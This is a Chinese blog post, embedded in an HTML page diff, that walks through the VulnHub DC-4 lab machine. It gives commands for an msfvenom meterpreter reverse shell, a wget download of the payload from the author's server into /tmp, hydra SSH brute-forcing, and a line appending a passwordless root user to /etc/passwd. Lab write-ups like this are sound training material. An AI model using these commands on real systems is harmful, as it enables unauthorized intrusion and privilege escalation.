@@ -1,0 +1,253 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>DC-4 · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2024-08-05">2024年8月5日</time>
+        
+        
+          <span class="post__readtime">3 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/vulnhub%E9%9D%B6%E6%9C%BA/">#vulnhub靶机</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">DC-4</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <h1 id="一、靶机安装"><a href="#一、靶机安装" class="headerlink" title="一、靶机安装"></a>一、靶机安装</h1><p>靶机下载地址<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-4,313/">DC: 4</a></p>
+<p>下载后将解压zip包得到ova文件，然后用VMware打开ova文件</p>
+<p><img src="/../img/Typora/image-20240805203011931.png" alt="image-20240805203011931"></p>
+<p>然后给靶机分配好名字和存储位置后导入</p>
+<p><img src="/../img/Typora/image-20240805203041147.png" alt="image-20240805203041147"></p>
+<h1 id="二、主机发现"><a href="#二、主机发现" class="headerlink" title="二、主机发现"></a>二、主机发现</h1><p>使用<code>arp-scan</code>进行主机发现</p>
+<p><img src="/../img/Typora/image-20240805203225244.png" alt="image-20240805203225244"></p>
+<h1 id="三、端口扫描"><a href="#三、端口扫描" class="headerlink" title="三、端口扫描"></a>三、端口扫描</h1><p>使用<code>nmap -p 0-65535 -T4 -sV 192.168.72.158</code>进行端口扫描</p>
+<p><img src="/../img/Typora/image-20240805203522055.png" alt="image-20240805203522055"></p>
+<p>在80端口开放了http服务，在22端口开放了ssh服务</p>
+<h1 id="四、访问web页面"><a href="#四、访问web页面" class="headerlink" title="四、访问web页面"></a>四、访问web页面</h1><p><img src="/../img/Typora/image-20240805203646977.png" alt="image-20240805203646977"></p>
+<p>访问web页面后。我试了试SQL万能密码。几个简单的弱口令。没有成效</p>
+<p>由于我弱口令爆破从来没成功过。所以这个靶机我也没想去用弱口令爆破</p>
+<p>然后又dirsearch扫了一下，什么都没有扫出来</p>
+<p><img src="/../img/Typora/image-20240805204132014.png" alt="image-20240805204132014"></p>
+<p>到这里就没什么思路了。。。。。。</p>
+<p>去看了一眼wp。。。。。</p>
+<p>我*…..还真是让弱口令爆破。。。。。。。</p>
+<p><code>admin</code>的密码是<code>happy</code></p>
+<p>我去我常用的字典里面看了看</p>
+<p>没有一个有<code>happy</code>的</p>
+<p><img src="/../img/Typora/image-20240805204405002.png" alt="image-20240805204405002"></p>
+<p>登录上去直接就可以进行rce了</p>
+<p><img src="/../img/Typora/image-20240805204717263.png" alt="image-20240805204717263"></p>
+<p><img src="/../img/Typora/image-20240805204758267.png" alt="image-20240805204758267"></p>
+<p>当我尝试反弹shell的时候。</p>
+<p>问题来了。</p>
+<p>试了好多命令都无法成功反弹shell</p>
+<p>个人猜测或许与<code>www-data</code>用户对<code>html</code>文件夹只有执行的权限有关。。。。但也不确定</p>
+<p><img src="/../img/Typora/image-20240805205151175.png" alt="image-20240805205151175"></p>
+<p>写文件也写不了</p>
+<p>直接反弹shell也不行。。</p>
+<p>突然间想到可以利用<code>/tmp</code>目录那shell</p>
+<p>所有用户对<code>/tmp</code>目录都是可读可写可执行的</p>
+<p><img src="/../img/Typora/image-20240805205334033.png" alt="image-20240805205334033"></p>
+<p>然后利用msf生成了一个木马文件<code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.72.135 LPORT=7777 -f elf &gt; asd</code></p>
+<p>将其放到自己服务器上。</p>
+<p>然后用<code>wget http://3*.1**.7*.***/kali/asd -P /tmp</code>将木马下载到靶机上面</p>
+<p>然后给木马上权限</p>
+<p><img src="/../img/Typora/image-20240805210021243.png" alt="image-20240805210021243"></p>
+<p>然后将shell反弹给msf</p>
+<p><img src="/../img/Typora/image-20240805210112585.png" alt="image-20240805210112585"></p>
+<h1 id="五、提权"><a href="#五、提权" class="headerlink" title="五、提权"></a>五、提权</h1><p>首先就是想试一试SUID提权</p>
+<p><img src="/../img/Typora/image-20240805210247922.png" alt="image-20240805210247922"></p>
+<p>觉得test.sh文件很可疑</p>
+<p>但是运行test.sh文件只是循环输出几句话</p>
+<p>然后权限还只是<code>jim</code>用户的</p>
+<p><img src="/../img/Typora/image-20240805210420200.png" alt="image-20240805210420200"></p>
+<p>在<code>jim</code>用户的备份目录下，发现了密码清单</p>
+<p><img src="/../img/Typora/image-20240805210554669.png" alt="image-20240805210554669"></p>
+<p>使用九头蛇进行ssh密码爆破<code> hydra -l jim -P Desktop/passwd ssh://192.168.72.158</code></p>
+<p><img src="/../img/Typora/image-20240805211001598.png" alt="image-20240805211001598"></p>
+<p>ssh成功登录</p>
+<p><img src="/../img/Typora/image-20240805211134729.png" alt="image-20240805211134729"></p>
+<p>登录时候我第一个尝试的是用sudo进行提权</p>
+<p>但是jim没有sudo权限</p>
+<p><img src="/../img/Typora/image-20240805211251359.png" alt="image-20240805211251359"></p>
+<p>然后我便没有提权思路了。。。。</p>
+<p>《偷偷瞅一眼wp》</p>
+<p>在我们刚刚登录上来的时候，提示我们有邮件</p>
+<p><img src="/../img/Typora/image-20240805211356312.png" alt="image-20240805211356312"></p>
+<p>使用<code>find / -name &quot;mail&quot;</code>找名字里含有mail的</p>
+<p><img src="/../img/Typora/image-20240805211500205.png" alt="image-20240805211500205"></p>
+<p>瞅一眼jim的邮件，发现charles把自己的密码告诉了jim</p>
+<p><img src="/../img/Typora/image-20240805211704747.png" alt="image-20240805211704747"></p>
+<p>“charles你个人机”</p>
+<p>切换到charles用户</p>
+<p>charles可以免密使用teehee</p>
+<p><img src="/../img/Typora/image-20240805211829270.png" alt="image-20240805211829270"></p>
+<p>使用teehee写一个超级用户到<code>/etc/passwd</code>中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Yliken::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240805212014077.png" alt="image-20240805212014077"></p>
+<h1 id="六、碎碎念"><a href="#六、碎碎念" class="headerlink" title="六、碎碎念"></a>六、碎碎念</h1><p>靶机全部打完之后</p>
+<p>去看了看其他人反弹shell那个地方，是如何进行反弹shell的。。。。</p>
+<p>好家伙nc直接反弹。。。</p>
+<p>不知道为什么我死活反弹不上去…..</p>
+<p>不过这个靶机大多数步骤都是靠自己完成的。。挺好玩的。</p>
+<p><img src="/../img/Typora/image-20240805212520178.png" alt="image-20240805212520178"></p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+  <section class="related" aria-label="相关阅读">
+    <h2 class="related__title">相关阅读</h2>
+    <ul class="related__list">
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-10-27">2024·10·27</time>
+          <a class="related__link" href="/2024/10/27/%E9%9D%B6%E6%9C%BA/hackmyvm/Hacker_Kid-v1.0.1/">Hacker_Kid-v1.0.1</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-10-10">2024·10·10</time>
+          <a class="related__link" href="/2024/10/10/%E9%9D%B6%E6%9C%BA/lazySysAdmin/">lazySysAdmin</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-09-27">2024·09·27</time>
+          <a class="related__link" href="/2024/09/27/%E9%9D%B6%E6%9C%BA/driftingblues2/">driftingblues2</a>
+        </li>
+      
+    </ul>
+  </section>
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2024/09/27/%E9%9D%B6%E6%9C%BA/driftingblues2/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">driftingblues2</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2024/08/02/%E9%9D%B6%E6%9C%BA/DC-3/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">DC-3</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
